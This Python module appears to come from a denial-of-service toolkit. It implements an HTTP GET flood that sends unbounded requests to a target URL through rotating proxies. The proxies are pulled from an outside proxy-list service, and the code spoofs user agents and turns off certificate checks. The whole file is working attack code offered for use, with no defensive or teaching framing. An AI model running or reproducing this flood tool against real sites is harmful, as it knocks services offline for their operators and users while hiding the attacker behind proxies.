"""This module provides the flood function for an HTTP GET request DoS attack through proxies."""

import json
import random
import sys
import warnings
from typing import Dict, List

import requests
from colorama import Fore as F
from requests.exceptions import ConnectionError, Timeout

warnings.filterwarnings("ignore", message="Unverified HTTPS request")

with open("tools/L7/user_agents.json", "r", encoding="utf-8") as agents:
    user_agents = json.load(agents)["agents"]

def get_http_proxies() -> List[Dict[str, str]]:
    """Return a list of available HTTP proxies.

    Args:
        None

    Returns:
        - proxies: A list of dictionaries containing HTTP proxies in the form of {"http": address:port, "https": address:port}
    """
    try:
        with requests.get(
            "https://api-scanproxy.onlitegix.com/files/4681d8fa6fda7f1fa3dd5d94d433bdbe.txt",
            verify=False,
            timeout=10
        ) as proxy_list:
            proxies = [
                {"http": proxy, "https": proxy}
                for proxy in proxy_list.text.split("\r\n")
                if proxy
            ]

    except Timeout:
        print(f"\n{F.RED}[!] {F.CYAN}Timeout occurred while connecting to the proxy service!{F.RESET}")
        sys.exit(1)
    except ConnectionError:
        print(f"\n{F.RED}[!] {F.CYAN}Connection error occurred. Check your internet connection!{F.RESET}")
        sys.exit(1)
    except Exception as e:
        print(f"{F.RED}[!] {F.CYAN}An unexpected error occurred: {e}{F.RESET}")
        sys.exit(1)

    return proxies

headers = {
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

proxies = get_http_proxies()
color_code = {True: F.GREEN, False: F.RED}

def flood(target: str) -> None:
    """Perform an HTTP GET request flood through proxies.

    Args:
        - target: The target URL to flood

    Returns:
        None
    """
    global proxies

    headers["User-Agent"] = random.choice(user_agents)

    while proxies:
        try:
            proxy = random.choice(proxies)
            response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
        except (Timeout, ConnectionError, OSError):
            print(f"{F.RED}[!] {F.CYAN}Request failed. Removing proxy.{F.RESET}")
            proxies.remove(proxy)
            if not proxies:
                proxies = get_http_proxies()
            continue
        else:
            status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
            payload_size = f"Requested Data Size: {F.CYAN}{round(len(response.content) / 1024, 2):>6} KB{F.RESET}"
            proxy_addr = f"Proxy: {F.CYAN}{proxy['http']:>21}{F.RESET}"
            print(f"{status} --> {payload_size} {proxy_addr}")

            # If the response is not successful, remove the proxy
            if response.status_code != 200:
                try:
                    proxies.remove(proxy)
                except ValueError:
                    pass

            if not proxies:
                proxies = get_http_proxies()
